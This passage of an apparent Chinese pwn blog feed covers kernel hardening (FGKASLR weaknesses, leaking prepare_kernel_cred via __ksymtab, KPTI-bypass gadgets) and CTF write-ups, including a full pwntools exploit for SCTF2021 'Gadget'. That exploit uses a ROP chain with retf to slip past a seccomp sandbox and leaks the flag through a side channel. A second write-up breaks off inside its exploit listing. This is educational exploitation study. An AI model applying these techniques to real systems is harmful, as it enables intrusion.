class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.data..percpu&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* get start addr for later */</span></span><br><span class="line">        percpu = s;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(s-&gt;sh_flags &amp; SHF_ALLOC) ||</span><br><span class="line">        !(s-&gt;sh_flags &amp; SHF_EXECINSTR) ||</span><br><span class="line">        !(strstarts(sname, <span class="string">&quot;.text&quot;</span>)))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    sections[num_sections] = s;</span><br><span class="line"></span><br><span class="line">    num_sections++;</span><br><span class="line">&#125;</span><br><span class="line">sections[num_sections] = <span class="literal">NULL</span>;</span><br><span class="line">sections_size = num_sections;</span><br></pre></td></tr></table></figure><p>可以看到，只有同时满足以下条件的节区才会参与随机化</p><ul><li>节区名以 .text 开头</li><li>section flags 中包含<code>SHF_ALLOC</code></li><li>section flags 中包含<code>SHF_EXECINSTR</code></li></ul><p>因此，通过以下命令，我们可以知道</p><ul><li><strong>__ksymtab 不会参与随机化</strong></li><li><strong>.data 不会参与随机化</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">readelf --section-headers -W vmlinux| grep -vE <span class="string">&quot; .text|AX&quot;</span></span></span><br><span class="line">...</span><br><span class="line">  [36106] .rodata           PROGBITS        ffffffff81c00000 e1e000 382241 00  WA  0   0 4096</span><br><span class="line">  [36107] .pci_fixup        PROGBITS        ffffffff81f82250 11a0250 002ed0 00   A  0   0 16</span><br><span class="line">  [36108] .tracedata        PROGBITS        ffffffff81f85120 11a3120 000078 00   A  0   0  1</span><br><span class="line">  [36109] __ksymtab         PROGBITS        ffffffff81f85198 11a3198 00b424 00   A  0   0  4</span><br><span class="line">  [36110] __ksymtab_gpl     PROGBITS        ffffffff81f905bc 11ae5bc 00dab8 00   A  0   0  4</span><br><span class="line">  [36111] __ksymtab_strings PROGBITS        ffffffff81f9e074 11bc074 027a82 01 AMS  0   0  1</span><br><span class="line">  [36112] __init_rodata     PROGBITS        ffffffff81fc5b00 11e3b00 000230 00   A  0   0 32</span><br><span class="line">  [36113] __param           PROGBITS        ffffffff81fc5d30 11e3d30 002990 00   A  0   0  8</span><br><span class="line">  [36114] __modver          PROGBITS        ffffffff81fc86c0 11e66c0 000078 00   A  0   0  8</span><br><span class="line">  [36115] __ex_table        PROGBITS        ffffffff81fc8740 11e6738 001c50 00   A  0   0  4</span><br><span class="line">  [36116] .notes            NOTE            ffffffff81fca390 11e8388 0001ec 00   A  0   0  4</span><br><span class="line">  [36117] .data             PROGBITS        ffffffff82000000 11ea000 215d80 00  WA  0   0 8192</span><br><span class="line">  [36118] __bug_table       PROGBITS        ffffffff82215d80 13ffd80 01134c 00  WA  0   0  1</span><br><span class="line">  [36119] .vvar             PROGBITS        ffffffff82228000 14110d0 001000 00  WA  0   0 16</span><br><span class="line">  [36120] .data..percpu     PROGBITS        0000000000000000 1413000 02e000 00  WA  0   0 4096</span><br><span class="line">  [36122] .rela.init.text   RELA            0000000000000000 149eec0 000180 18   I 36137 36121  8</span><br><span class="line">  [36124] .init.data        PROGBITS        ffffffff822b6000 14a0000 18d1a0 00  WA  0   0 8192</span><br><span class="line">  [36125] .x86_cpu_dev.init PROGBITS        ffffffff824431a0 162d1a0 000028 00   A  0   0  8</span><br><span class="line">  [36126] .parainstructions PROGBITS        ffffffff824431c8 162d1c8 01e04c 00   A  0   0  8</span><br><span class="line">  [36127] .altinstructions  PROGBITS        ffffffff82461218 164b214 003a9a 00   A  0   0  1</span><br><span class="line">  [36129] .iommu_table      PROGBITS        ffffffff82465bb0 164fbb0 0000a0 00   A  0   0  8</span><br><span class="line">  [36130] .apicdrivers      PROGBITS        ffffffff82465c50 164fc50 000038 00  WA  0   0  8</span><br><span class="line">  [36132] .smp_locks        PROGBITS        ffffffff82468000 1651610 007000 00   A  0   0  4</span><br><span class="line">  [36133] .data_nosave      PROGBITS        ffffffff8246f000 1658610 001000 00  WA  0   0  4</span><br><span class="line">  [36134] .bss              NOBITS          ffffffff82470000 165a000 590000 00  WA  0   0 4096</span><br><span class="line">  [36135] .brk              NOBITS          ffffffff82a00000 1659610 02c000 00  WA  0   0  1</span><br><span class="line">  [36136] .init.scratch     PROGBITS        ffffffff82c00000 1659620 400000 00  WA  0   0 32</span><br><span class="line">  [36137] .symtab           SYMTAB          0000000000000000 1a59620 30abd8 18     36138 111196  8</span><br><span class="line">  [36138] .strtab           STRTAB          0000000000000000 1d641f8 219a29 00      0   0  1</span><br><span class="line">  [36139] .shstrtab         STRTAB          0000000000000000 1f7dc21 0ed17b 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="性能开销"><a href="#性能开销" class="headerlink" title="性能开销"></a>性能开销</h4><p>FGKASLR 对于性能的影响主要来自于两个阶段：启动，运行。</p><h5 id="启动阶段"><a href="#启动阶段" class="headerlink" title="启动阶段"></a>启动阶段</h5><p>在启动阶段，FGKASLR</p><ul><li>需要解析内核的 ELF 文件来获取需要随机化的节区。</li><li>会调用随机数生成器来确定每个节区需要存储的地址，并进行布局。</li><li>会将原有解压的内核拷贝到另外一个地方，以便于避免内存破坏。</li><li>会增加内核需要重定位的次数。</li><li>需要检查每一个需要重定位的地址是否位于随机化的节区，如果是的话，需要调整一个新的偏移。</li><li>会重新排列那些需要按照地址排序的数据表。</li></ul><p>在一个现代化的系统上，启动一个测试的 VM，大概花费了 1s。</p><h5 id="运行阶段"><a href="#运行阶段" class="headerlink" title="运行阶段"></a>运行阶段</h5><p>运行阶段的开销其实主要取决于具体的负载。不过由于原先相邻的函数可能被随机化被放在不同的地址，所以相对而言，整体性能应该会有所降低。</p><h4 id="内存开销"><a href="#内存开销" class="headerlink" title="内存开销"></a>内存开销</h4><p><strong>在启动阶段，FGKASLR 需要较多的堆内存</strong>。因此，FGKASLR 可能不适用于具有较小内存的系统上。这些内存会在内核解压后被释放。</p><h4 id="程序大小影响"><a href="#程序大小影响" class="headerlink" title="程序大小影响"></a>程序大小影响</h4><p>FGKASLR <u>会引入额外的节区头部信息</u>，因此会增加 vmlinux 文件的大小。在标准的配置下，vmlinux 的大小会增加 3%。压缩后的镜像大小大概会增加 15%。</p><h4 id="开启与关闭"><a href="#开启与关闭" class="headerlink" title="开启与关闭"></a>开启与关闭</h4><h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><p>如果想要开启内核的 FGKASLR，你需要开启 <code>CONFIG_FG_KASLR=y</code> 选项。</p><p>FGKASLR 也支持模块的随机化，尽管 FGKASLR 只支持 x86_64 架构下的内核，但是该特性可以支持其它架构下的模块。我们可以使用 <code>CONFIG_MODULE_FG_KASLR=y</code> 来开启这个特性。</p><h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><p>通过在命令行使用 <code>nokaslr</code> 关闭 KASLR 也同时会关闭 FGKASLR。当然，我们可以单独使用 <code>nofgkaslr</code> 来关闭 FGKASLR。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>根据 FGKASLR 的特点，我们可以发现它具有以下缺陷</p><ul><li>函数粒度随机化，如果函数内的某个地址知道了，函数内部的相对地址也就知道了。</li><li><code>.text</code>节区不参与函数随机化。因此，一旦知道其中的某个地址，就可以获取该节区所有的地址。有意思的是<strong>系统调用的入口代码都在该节区内</strong>，主要是因为<u>这些代码都是汇编代码</u>。此外，该节区具有以下一些不错的 gadget<ul><li><strong>swapgs_restore_regs_and_return_to_usermode，该部分的代码可以帮助我们绕过 KPTI 防护</strong></li><li><strong>memcpy 内存拷贝</strong></li><li><strong>sync_regs，可以把 RAX 放到 RDI 中</strong></li></ul></li><li><strong><code>__ksymtab</code>相对于内核镜像的偏移是固定的</strong>。因此，如果我们可以泄露数据，那就可以泄露出其它的符号地址，如 prepare_kernel_cred、commit_creds。具体方式如下<ul><li>基于内核镜像地址获取 __ksymtab 地址</li><li>基于 __ksymtab 获取对应符号记录项的地址</li><li>根据符号记录项中具体的内容来获取对应符号的地址</li></ul></li><li><strong>data 节区相对于内核镜像的偏移也是固定的</strong>。因此在获取了内核镜像的基地址后，就可以计算出数据区数据的地址。这个节区有一些可以重点关注的数据<ul><li>modprobe_path</li></ul></li></ul><h5 id="ksymtab-格式"><a href="#ksymtab-格式" class="headerlink" title="__ksymtab 格式"></a>__ksymtab 格式</h5><p><strong>ksymtab 中每个记录项的名字的格式为 `</strong>ksymtab_func_name<code>，以</code>prepare_kernel_cred<code>为例，对应的记录项的名字为</code>__ksymtab_prepare_kernel_cred`，因此，我们可以直接通过该名字在 IDA 里找到对应的位置，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF81F8D4FC __ksymtab_prepare_kernel_cred dd 0FF5392F4h</span><br><span class="line">__ksymtab:FFFFFFFF81F8D500                 dd 134B2h</span><br><span class="line">__ksymtab:FFFFFFFF81F8D504                 dd 1783Eh</span><br></pre></td></tr></table></figure><p><code>__ksymtab</code> 每一项的结构为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> value_offset;</span><br><span class="line">    <span class="type">int</span> name_offset;</span><br><span class="line">    <span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第一个表项记录了<u>重定位表项相对于当前地址的偏移</u>。那么，<code>prepare_kernel_cred</code> 的地址应该为 <code>0xFFFFFFFF81F8D4FC-(2**32-0xFF5392F4)=0xffffffff814c67f0</code>。实际上也确实如此。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0                 public prepare_kernel_cred</span><br><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0 prepare_kernel_cred proc near      </span><br></pre></td></tr></table></figure><h2 id="heap-protection"><a href="#heap-protection" class="headerlink" title="heap protection"></a>heap protection</h2><h3 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h3><p>hardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界</p><h3 id="Hardened-freelist"><a href="#Hardened-freelist" class="headerlink" title="Hardened freelist"></a>Hardened freelist</h3><p>类似于 glibc 2.32 版本引入的保护，在开启这种保护之前，slub 中的 free object 的 next 指针直接存放着 next free object 的地址，攻击者可以通过读取 freelist 泄露出内核线性映射区的地址，在开启了该保护之后 free object 的 next 指针存放的是由以下三个值进行异或操作后的值</p><blockquote><p>当前 free object 的地址<br>下一个 free object 的地址<br>由 kmem_cache 指定的一个 random 值</p></blockquote><h3 id="Random-freelist"><a href="#Random-freelist" class="headerlink" title="Random freelist"></a>Random freelist</h3><p>这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object 之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/20220617161458.png" alt=""></p><p><strong>需要注意的是这种保护发生在slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂题录</title>
      <link href="/posts/4584/"/>
      <url>/posts/4584/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF2021-Gadget"><a href="#SCTF2021-Gadget" class="headerlink" title="SCTF2021 Gadget"></a>SCTF2021 Gadget</h1><p><strong>标签:retf|侧信道攻击|沙盒</strong></p><p>程序是静态链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>程序有seccomp只允许三个系统调用</p><p>传统的orw,因为只有<code>read</code>，<code>open</code>和<code>write</code>都被禁用而无法使用。</p><p>再回到程序本身程序读取时存在栈溢出,这是主要的漏洞点</p><p>不过可以观察到沙盒并没有限制系统的ARCH,同时fstat的系统调用号在32位中恰好是open的系统调用</p><p>搜索gadget,可以发现存在retf,retf可以用来切换32位模式(ropper搜索并没有找到这个gadget,但ROPgadget找到了,ropper也可以找到不过要用—instructions选项,因此找gadget还是要小心一点)</p><p>此时open的问题解决了,但还有一个问题,就是程序没有输出,一个可行的方案是采用侧信道的方式逐个输出</p><blockquote><p>侧信道攻击：在程序无法回显时，通过程序反馈的信息对进行flag逐位爆破。</p></blockquote><p>恰好程序中有这么一段gadget</p><p><code>cmp byte ptr [rax - 0x46], cl; push rbp; ret 0x5069;</code></p><p>和一段无限循环的代码</p><p><code>.text:0000000000405837 EB FE                         jmp     short loc_405837</code></p><p>用这两部分代码来探测是否爆破成功</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rbx_r14_r15_rbp_ret = <span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_rdi_jmp_rax = <span class="number">0x402be4</span></span><br><span class="line">pop_rsi_r15_rbp_ret = <span class="number">0x401732</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span> <span class="comment"># call -&gt; push + jmp</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span> <span class="comment"># mov edi,...</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">retf_addr = <span class="number">0x4011ed</span></span><br><span class="line">cmp_addr = <span class="number">0x408266</span> <span class="comment"># cmp byte ptr [rax - 0x46], cl ; push rbp ; ret 0x5069</span></span><br><span class="line">jnz_addr = <span class="number">0x405831</span> <span class="comment"># jnz  0x405837</span></span><br><span class="line">loop = <span class="number">0x405837</span> <span class="comment"># jmp  0x405837</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">index, char</span>):</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rax_ret) + p64(<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbx_r14_r15_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(retf_addr) + p32(int_0x80_ret) + p32(<span class="number">0x23</span>)</span><br><span class="line">payload += p32(retf_addr) + p32(pop_rax_ret) + p32(<span class="number">0x33</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_rbp_ret) + p64(<span class="number">3</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_rbp_ret) + p64(bss_addr + <span class="number">0x200</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(syscall_pop_rbp_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss_addr + <span class="number">0x200</span> + <span class="number">0x46</span> + index)</span><br><span class="line">payload += p64(pop_rcx_ret) + p64(char)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(jnz_addr)</span><br><span class="line">payload += p64(cmp_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible_list :</span><br><span class="line">io = process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p>当爆破成功时,程序就会段错误,那么调用recv时就会立即捕获到错误,以此判断成功</p><p>当爆破失败时,程序就会进入无限循环,从而自行结束开始下一次运行</p><h1 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯 shellcode"></a>2021强网杯 shellcode</h1><p><strong>标签:retf|侧信道攻击|沙盒|可见字符shellcode|SMC</strong></p><p>这一题与上一题一个套路</p><p>程序就只由一段代码构成,看来应该是手搓的elf</p><p>开启了沙盒只允许有限几个系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>程序执行的内容很简单</p><p>mmap分配一块rwx的内存,向其中读入数据作为shellcode运行</p><p>不过限制读入的shellcode必须要由可见字符构成,这个限制就使得很多汇编代码无法使用,包括syscall等等,可以使用smc绕过</p><p>延续上一题的思路需要使用retf,但是这题与上一题不同在于其没有bss段,所以在切换系统宽度时会出错</p><p>这时候可以自己指定地址mmap一块内存</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span 